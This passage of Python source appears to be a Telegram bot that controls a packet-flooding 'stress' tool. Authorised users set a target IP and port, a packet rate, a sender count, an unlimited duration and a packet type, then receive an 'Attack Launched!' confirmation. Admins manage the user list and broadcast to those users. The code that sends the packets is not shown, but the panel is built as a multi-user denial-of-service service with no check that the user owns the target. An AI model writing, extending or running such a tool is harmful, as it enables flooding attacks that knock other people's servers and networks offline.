            self.pending.pop(uid, None)
            await self._typing(msg.chat.id)
            delivered, failed = 0, 0
            for u in self.access.list():
                if u == SUPER_ADMIN_ID:
                    continue
                try:
                    await self.bot.send_message(
                        u,
                        f"📢 **Broadcast from Admin**\n{SEP_THICK}\n{text}\n"
                        f"{SEP_THICK}\n👑 *{CREDITS}*"
                    )
                    delivered += 1
                except Exception:
                    failed += 1
            await msg.reply_text(
                f"📢 Broadcast delivered: `{delivered}` • failed: `{failed}`"
            )
            return True

        # ---- Target / quick launch ----
        parsed = parse_target(text)
        if parsed and (action in ("launch", "target") or ":" in text):
            ip, port = parsed
            self.config.target_ip = ip
            self.config.target_port = port

            if action == "launch":
                self.pending.pop(uid, None)
                ok, err = await self.start_test()
                if ok:
                    await self._sticker(msg.chat.id, "launch")
                    await msg.reply_text(
                        f"🚀 **Attack Launched!**\n{SEP_THICK}\n"
                        f"🎯 Target  : `{ip}:{port}`\n"
                        f"⚡ Rate    : `{self.config.pps}` PPS × `{self.config.senders}`\n"
                        f"⏱️ Duration: `{self.config.duration or '∞'}s`\n"
                        f"📦 Packet  : `{self.config.packet_type.upper()}`\n"
                        f"{SEP_THICK}\n"
                        f"_Panel auto-refreshes every {REFRESH_INTERVAL}s._"
                    )
                    await self.show_panel(msg)
                else:
                    await msg.reply_text(f"⚠️ Could not start: {err}")
                return True

            self.pending.pop(uid, None)
            await msg.reply_text(
                f"✅ Target set to `{ip}:{port}`\n"
                f"Send /admin to open the panel."
            )
            return True

        # ---- Numeric inputs ----
        if text.lstrip("-").isdigit():
            n = int(text)
            if action == "pps":
                self.config.pps = max(1, min(n, 100_000))
                await msg.reply_text(f"✅ Rate = `{self.config.pps}` PPS")
            elif action == "senders":
                self.config.senders = max(1, min(n, 64))
                await msg.reply_text(f"✅ Senders = `{self.config.senders}`")
            elif action == "duration":
                self.config.duration = max(0, n)
                await msg.reply_text(f"✅ Duration = `{self.config.duration}s`")
            elif action == "user_add":
                if uid != SUPER_ADMIN_ID:
                    await msg.reply_text("🚫 Only the super admin can add users.")
                else:
                    ok = self.access.add(n)
                    await msg.reply_text(
                        f"✅ User `{n}` added." if ok
                        else f"ℹ️ User `{n}` is already authorized."
                    )
            else:
                return False
            self.pending.pop(uid, None)
            return True

        return False

    # -----------------------------------------------------------------
    # Lifecycle
    # -----------------------------------------------------------------
    async def run(self):
        await self.bot.start()
        logger.info("🤖 Bot online. Super admin: %s", SUPER_ADMIN_ID)
        logger.info("👑 Author: Bobby Maharaj")
        try:
            await asyncio.Event().wait()
        finally:
            await self.stop_test()
            await self.bot.stop()


# ===================================================================
# Entry point
# ===================================================================
async def main():
    manager = StressManager()

    @manager.bot.on_message(filters.private & ~filters.command(
        ["start", "admin", "panel", "help", "credits", "stats", "history", "logs"]
    ))
    async def route_config(_, msg: Message):
        await manager.handle_config_message(msg)

    await manager.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bye. 👑 Bobby Maharaj")